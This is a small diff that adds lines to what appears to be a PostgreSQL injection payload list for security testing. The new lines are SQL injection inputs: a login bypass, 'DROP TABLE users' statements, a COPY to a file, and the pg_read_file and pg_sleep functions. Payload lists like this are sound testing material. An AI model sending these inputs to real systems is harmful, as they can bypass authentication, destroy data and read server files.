@@ -1,2 +1,9 @@
--e # postgresql Payload 5
+-e # PostgreSQL Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+admin' --
+'; DROP TABLE users;--
+1; DROP TABLE users
+COPY users TO '/tmp/test'
+pg_read_file()
+pg_sleep()
